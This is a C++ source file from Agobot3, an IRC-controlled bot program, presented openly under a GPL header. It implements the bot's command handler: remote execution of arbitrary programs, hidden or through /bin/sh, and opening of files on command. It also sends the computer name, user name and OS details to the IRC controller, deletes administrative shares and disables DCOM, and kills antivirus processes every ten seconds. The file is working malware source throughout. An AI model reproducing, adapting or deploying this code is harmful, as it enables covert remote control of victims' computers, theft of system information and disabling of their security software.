/*	Agobot3 - a modular IRC bot for Win32 / Linux
	Copyright (C) 2003 Ago

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. */

#include "main.h"
#include "bot.h"
#include "mainctrl.h"
#include "random.h"
#include "utility.h"

CBot::CBot() { m_bJoined=false; }

/* No Comment :P */

void CBot::Init()
{	init_random();
	
	Config();

	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdAbout,		"bot.about",		"displays the info the author wants you to see",	this);
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdDie,			"bot.die",			"terminates the bot",								this);
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdDns,			"bot.dns",			"resolves ip/hostname by dns",						this);
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdExecute,		"bot.execute",		"makes the bot execute a .exe",						this);
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdId,			"bot.id",			"displays the id of the current code",				this);
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdNick,			"bot.nick",			"changes the nickname of the bot",					this);
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdOpen,			"bot.open",			"opens a file (whatever)",							this);
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdRemove,		"bot.remove",		"removes the bot",									this);
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdRemoveAllBut,	"bot.removeallbut",	"removes the bot if id does not match",				this);
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdRndNick,		"bot.rndnick",		"makes the bot generate a new random nick",			this);
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdStatus,		"bot.status",		"gives status",										this);
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdSysInfo,		"bot.sysinfo",		"displays the system info",							this);
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdLongUptime,   "bot.longuptime",	"If uptime > 7 days then bot will respond",			this);
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdQuit,			"bot.quit",			"quits the bot",									this);
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdFlushDNS,		"bot.flushdns",		"flushes the bots dns cache",						this);
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdSecure,		"bot.secure",		"delete shares / disable dcom",						this);

	CString sRndNick=RndNick(si_nickprefix.sValue.CStr());
	g_cMainCtrl.m_cIRC.SendRawFormat("NICK %s\r\n", sRndNick.CStr());
	g_cMainCtrl.m_sUserName.Format("%s", sRndNick.Mid(0, 32).CStr());
	m_lStartTime=(unsigned long)GetTickCount()/1000;
}


void CBot::Recv(CMessage *pMsg)
{
#ifdef DBGCONSOLE
	if(pMsg->sDest[0]=='#')
		g_cMainCtrl.m_cConsDbg.Log(5, "<%s> %s\n", pMsg->sSrc.CStr(), pMsg->sChatString.CStr());
	else
		g_cMainCtrl.m_cConsDbg.Log(5, "*%s* %s\n", pMsg->sSrc.CStr(), pMsg->sChatString.CStr());
#endif

	if(pMsg->sDest[0]=='#') pMsg->sReplyTo.Assign(pMsg->sDest); else pMsg->sReplyTo.Assign(pMsg->sSrc);
	if(pMsg->bNotice) pMsg->sReplyTo.Assign(pMsg->sSrc);
	pMsg->sCmd.Assign(pMsg->sChatString.Token(0, " ").Mid(1));

	// Check if its a bot command by comparing the first byte to the bot_prefix value
	if(pMsg->sChatString[0]==bot_prefix.sValue[0]) {
			if(!pMsg->sCmd.Compare("bot.repeat")) {
			if(!pMsg->sChatString.Token(1, " ").Compare("")) return;
			int i=0, iNum=atoi(pMsg->sChatString.Token(1, " ").CStr()); if(!iNum) return;
			CString sNewCStr=pMsg->sChatString.Mid(pMsg->sChatString.Find(' '));
			sNewCStr=sNewCStr.Mid(sNewCStr.Find(' '));
			pMsg->sChatString.Assign(sNewCStr); pMsg->sCmd.Assign(pMsg->sChatString.Token(0, " ").Mid(1));
			for(i=0;i<iNum;i++) HandleMsg(pMsg); }
		else
			HandleMsg(pMsg);
	} else { //botname .command mod - deejayfuzion
		if(pMsg->sChatString.Token(0, " ").Find(g_cMainCtrl.m_sUserName)) {
			CString sNewCStr=pMsg->sChatString.Mid(pMsg->sChatString.Find(' '));
			pMsg->sChatString.Assign(sNewCStr);
			pMsg->sCmd.Assign(pMsg->sChatString.Token(0, " "));
			this->Recv(pMsg); }
	}
}

bool CBot::HandleMsg(CMessage *pMsg)
{	// If it's no login command and the user isn't logged in yet, break
	if(pMsg->sCmd.Compare("login") && !g_cMainCtrl.m_cMac.FindLogin(pMsg->sSrc)) return false;
	else
	{	// If the user isn't logged in yet, bot_seclogin is enabled and its no channel message, break;
		if(!g_cMainCtrl.m_cMac.FindLogin(pMsg->sSrc))
			if(bot_seclogin.bValue) if(pMsg->sDest[0]!='#') return false;
		// Find the command using the command handler
		command *pCommand=g_cMainCtrl.m_cCommands.FindCommandByName(pMsg->sCmd.CStr(), true);
		// If the command is found, let the command hander handle it
		if(pCommand) return pCommand->pHandler->HandleCommand(pMsg); else return false; } }

bool CBot::Think()
{	static unsigned long lLastAVKill;

	// If the IRC connection timed out, reset it
	if((GetTickCount()-g_cMainCtrl.m_cIRC.m_lLastRecv) > bot_timeout.iValue)
	{	g_cMainCtrl.m_cIRC.Fail(); g_cMainCtrl.m_cIRC.m_lLastRecv=GetTickCount(); }
	
	// Kill all AV processes every 10 seconds
	if((GetTickCount()-lLastAVKill) > 10000)
	{	KillAV(); lLastAVKill=GetTickCount(); }

	return true; }

bool CBot::HandleCommand(CMessage *pMsg)
{	
	if(!pMsg->sCmd.Compare("bot.remove") || !pMsg->sCmd.Compare("bot.removeallbut")) {
		CString sId(pMsg->sChatString.Token(1, " ", true));
		if(!pMsg->sCmd.Compare("bot.removeallbut")) if(!sId.Compare(g_cMainCtrl.m_cBot.bot_id.sValue)) return false;
		g_cMainCtrl.m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, "removing bot...", pMsg->sReplyTo);
#ifdef WIN32
		if(g_cMainCtrl.m_cBot.as_enabled.bValue) g_cMainCtrl.m_cInstaller.RegStartDel(g_cMainCtrl.m_cBot.as_valname.sValue);
#endif
		g_cMainCtrl.m_cInstaller.Uninstall();
		g_cMainCtrl.m_cIRC.m_bRunning=false; g_cMainCtrl.m_bRunning=false; }

	else if(!pMsg->sCmd.Compare("bot.execute")) {
		CString sText(pMsg->sChatString.Token(2, " ", true)); bool bVisible=atoi(pMsg->sChatString.Token(1, " ").CStr())==1;
#ifdef WIN32
		CString sTextExp; ExpandEnvironmentStrings(sText.CStr(), sTextExp.GetBuffer(8192), 8192); // interpret environment variables
		sText.Assign(sTextExp); PROCESS_INFORMATION pinfo; STARTUPINFO sinfo;
		memset(&sinfo, 0, sizeof(STARTUPINFO)); sinfo.cb=sizeof(sinfo);
		if(bVisible) sinfo.wShowWindow=SW_SHOW; else sinfo.wShowWindow=SW_HIDE;
		if(!CreateProcess(NULL, sText.Str(), NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, NULL, &sinfo, &pinfo)) {
			g_cMainCtrl.m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, "couldn't execute file.", pMsg->sReplyTo.Str()); return false; }
#else
		CString sCmdBuf; sCmdBuf.Format("/bin/sh -c \"%s\"", sText.CStr());
		if(system(sCmdBuf.CStr())==-1) { g_cMainCtrl.m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, "couldn't execute file.", pMsg->sReplyTo.Str()); return false; }
#endif
		return true; }

	else if(!pMsg->sCmd.Compare("bot.open")) {
		if(!(pMsg->sChatString.GetLength() > (pMsg->sCmd.GetLength()+pMsg->sChatString.Token(1, " ").GetLength()+3))) return false;
		CString sText; sText.Assign(&pMsg->sChatString[pMsg->sCmd.GetLength()+2]); bool bRet=false;
#ifdef WIN32
		bRet=(int)ShellExecute(0, "open", sText.CStr(), NULL, NULL, SW_SHOW)>=32;
#else
		bRet=system(sText.CStr())>0;
#endif
		if(bRet) return g_cMainCtrl.m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, "file opened.", pMsg->sReplyTo.Str());
		else return g_cMainCtrl.m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, "couldn't open file.", pMsg->sReplyTo.Str()); }

	else if(!pMsg->sCmd.Compare("bot.dns")) {
		CString sReply; hostent *pHostent=NULL; in_addr iaddr;
		if(!pMsg->sChatString.Token(1, " ").Compare("")) return false;
		unsigned long addr=inet_addr(pMsg->sChatString.Token(1, " ").CStr());
	
		if(addr!=INADDR_NONE) {
			pHostent=gethostbyaddr((char*)&addr, sizeof(struct in_addr), AF_INET);
			if(pHostent) {
				sReply.Format("%s -> %s", pMsg->sChatString.Token(1, " ").CStr(), pHostent->h_name);
				return g_cMainCtrl.m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, sReply.Str(), pMsg->sReplyTo.Str()); }
		} else {
			pHostent=gethostbyname(pMsg->sChatString.Token(1, " ").CStr());
			if(pHostent) {
				iaddr=*((in_addr*)*pHostent->h_addr_list);
				sReply.Format("%s -> %s", pMsg->sChatString.Token(1, " ").CStr(), inet_ntoa(iaddr));
				return g_cMainCtrl.m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, sReply.Str(), pMsg->sReplyTo.Str()); } }
		
		if(!pHostent) {
			sReply.Format("couldn't resolve host \"%s\"!", pMsg->sChatString.Token(1, " ").CStr());
			return g_cMainCtrl.m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, sReply.Str(), pMsg->sReplyTo.Str()); } }

	else if(!pMsg->sCmd.Compare("bot.about")) {
		CString sReplyBuf; sReplyBuf.Format("%s by Ago (theago@gmx.net). homepage: http://none.yet/", g_cMainCtrl.m_sNameVerStr.CStr());
		return g_cMainCtrl.m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, sReplyBuf.Str(), pMsg->sReplyTo.Str()); }

	else if(!pMsg->sCmd.Compare("bot.id")) {
		return g_cMainCtrl.m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, bot_id.sValue.Str(), pMsg->sReplyTo.Str()); }

	else if(!pMsg->sCmd.Compare("bot.nick")) {
		g_cMainCtrl.m_sUserName.Format("%s", pMsg->sChatString.Token(1, " ", true).Mid(0, 32).CStr());
		g_cMainCtrl.m_cIRC.SendRawFormat("NICK %s\r\n", g_cMainCtrl.m_sUserName.CStr());
		return true; }

	else if(!pMsg->sCmd.Compare("bot.quit") || !pMsg->sCmd.Compare("bot.die")) {
		g_cMainCtrl.m_cIRC.m_bRunning=false; return true; }

	else if(!pMsg->sCmd.Compare("bot.sysinfo")) {
		return g_cMainCtrl.m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, SysInfo().Str(), pMsg->sReplyTo.Str()); }

	else if(!pMsg->sCmd.Compare("bot.longuptime")) {
		int iDays=atoi(pMsg->sChatString.Token(1, " ").CStr()); if(!iDays) iDays=7;
		CString sUptime=LongUptime(iDays);
		if(sUptime.Compare("")) {
			g_cMainCtrl.m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, \
				sUptime.Str(), pMsg->sReplyTo.Str()); }
		return true; }

	else if(!pMsg->sCmd.Compare("bot.status")) {
		return g_cMainCtrl.m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, Status().Str(), pMsg->sReplyTo.Str()); }

	else if(!pMsg->sCmd.Compare("bot.rndnick")) {
		CString sRndNick=RndNick(si_nickprefix.sValue.CStr());
		g_cMainCtrl.m_cIRC.SendRawFormat("NICK %s\r\n", sRndNick.CStr());
		g_cMainCtrl.m_sUserName.Format("%s", sRndNick.Mid(0, 32).CStr());
		return true; }

	else if(!pMsg->sCmd.Compare("bot.flushdns")) {
#ifdef WIN32
		Execute("ipconfig.exe", "/flushdns");
#else
		Execute("nscd", "-i hosts");
#endif // WIN32
		return true; }

	else if(!pMsg->sCmd.Compare("bot.secure")) {	
#ifdef WIN32
		// Set EnableDCOM to "N"
		HKEY hkey=NULL; DWORD dwSize=128; char szDataBuf[128];
		sprintf(szDataBuf, "N"); dwSize=strlen(szDataBuf);
		LONG lRet=RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\OLE", 0, KEY_READ, &hkey);
		RegSetValueEx(hkey, "EnableDCOM", NULL, REG_SZ, (unsigned char*)szDataBuf, dwSize);
		RegCloseKey(hkey);

		// Secure Shares
		system("net share c$ /delete /y");
		system("net share d$ /delete /y");
		system("net share ipc$ /delete /y");
		system("net share admin$ /delete /y");
#endif
		return true; }

	return false; }

CString CBot::SysInfo()
{	CString sSysInfo;
#ifdef WIN32
	int total=GetTickCount()/1000;
	MEMORYSTATUS memstat; OSVERSIONINFO verinfo;
	char szBuffer[MAX_COMPUTERNAME_LENGTH + 1];
	DWORD dwNameSize = MAX_COMPUTERNAME_LENGTH + 1;
	char *szCompname;
	TCHAR szUserName[21];
	DWORD dwUserSize = sizeof(szUserName);

	GlobalMemoryStatus(&memstat); verinfo.dwOSVersionInfoSize=sizeof(OSVERSIONINFO); GetVersionEx(&verinfo); char *os; char os2[140];
	if(verinfo.dwMajorVersion==4 && verinfo.dwMinorVersion==0)
	{	if(verinfo.dwPlatformId==VER_PLATFORM_WIN32_WINDOWS)			os="95";
		if(verinfo.dwPlatformId==VER_PLATFORM_WIN32_NT)					os="NT"; }
	else if(verinfo.dwMajorVersion==4 && verinfo.dwMinorVersion==10)	os="98";
	else if(verinfo.dwMajorVersion==4 && verinfo.dwMinorVersion==90)	os="ME";
	else if(verinfo.dwMajorVersion==5 && verinfo.dwMinorVersion==0)		os="2000";
	else if(verinfo.dwMajorVersion==5 && verinfo.dwMinorVersion==1)		os="XP";
	else if(verinfo.dwMajorVersion==5 && verinfo.dwMinorVersion==2)		os="2003";
	else																os="???";

	if(verinfo.dwPlatformId==VER_PLATFORM_WIN32_NT && verinfo.szCSDVersion[0]!='\0')
	{	sprintf(os2, "%s [%s]", os, verinfo.szCSDVersion); os=os2; }
	GetComputerName(szBuffer, &dwNameSize);
	szCompname = szBuffer;
	GetUserName(szUserName, &dwUserSize);

	// *** PhaTTy <MOD> Changed ram: to ##MB/##MB , added box: , added user: </MOD>

	sSysInfo.Format("cpu: %dMHz. ram: %dMB/%dMB. os: Windows %s (%d.%d, build %d). uptime: %dd %dh %dm box: %s. user: %s.",
	cpuspeed(), memstat.dwAvailPhys/1046528, memstat.dwTotalPhys/1046528, os, verinfo.dwMajorVersion, verinfo.dwMinorVersion, verinfo.dwBuildNumber, total/86400, (total%86400)/3600, ((total%86400)%3600)/60, szCompname, szUserName);


#else
	FILE *fp=fopen("/proc/uptime", "r");
	float f1, f2;
	
	if(!fp) return CString("Error: Can't open /proc/uptime!");

	if(fscanf(fp, "%f %f", &f1, &f2)<2) return CString("Error: Invalid or changed /proc/uptime format!");

	fclose(fp);
	
	int days, hours, minutes;
	days=((abs((int)f1)/60)/60)/24;
	hours=((abs((int)f1)/60)/60)%24;
	minutes=(abs((int)f1)/60)%60;

	int iDistro=GetDistro(); char *szVersion; char *szKVersion;
	bool bGotVer=GetVersion(&szVersion, iDistro);
	bool bGotKVer=GetKVersion(&szKVersion, iDistro);
	
	if(!bGotVer) szVersion="Unknown\n"; if(!bGotKVer) szKVersion="Unknown\n";
	
	sSysInfo.Format("cpu: %dMHz. os: %s. kernel: %s. uptime: %dd %dh %dm", cpuspeed(), szVersion, szKVersion, days, hours, minutes);

	free(szVersion); free(szKVersion);
#endif
	return sSysInfo; }

CString CBot::LongUptime(int iDays)  // If uptime > iDays days then bot will reply with uptime stats. - PhaTTy
{	CString sLongUptime;
	if (iDays == 0) return false;
#ifdef WIN32
	int total=GetTickCount()/1000;
	OSVERSIONINFO verinfo;

	if(total/86400 >= iDays) sLongUptime.Format("uptime: %dd %dh %dm",total/86400, (total%86400)/3600, ((total%86400)%3600)/60);
	else return CString("");
#else
	FILE *fp=fopen("/proc/uptime", "r");
	float f1, f2;
	
	if(!fp) return CString("Error: Can't open /proc/uptime!");

	if(fscanf(fp, "%f %f", &f1, &f2)<2) return CString("Error: Invalid or changed /proc/uptime format!");

	fclose(fp);
	
	int days, hours, minutes;
	days=((abs((int)f1)/60)/60)/24;
	hours=((abs((int)f1)/60)/60)%24;
	minutes=(abs((int)f1)/60)%60;

	if(days >= iDays) sLongUptime.Format("uptime: %dd %dh %dm", days, hours, minutes);
	else return CString("");
#endif // WIN32
	return sLongUptime; }

CString CBot::Status()
{	CString sStatus; unsigned long total, days, hours, minutes; total=(GetTickCount()/1000)-m_lStartTime;
	days=total/86400; hours=(total%86400)/3600; minutes=((total%86400)%3600)/60;
	sStatus.Format("%s ready. Up %dd %dh %dm.", g_cMainCtrl.m_sNameVerStr.CStr(), days, hours, minutes); return sStatus; }
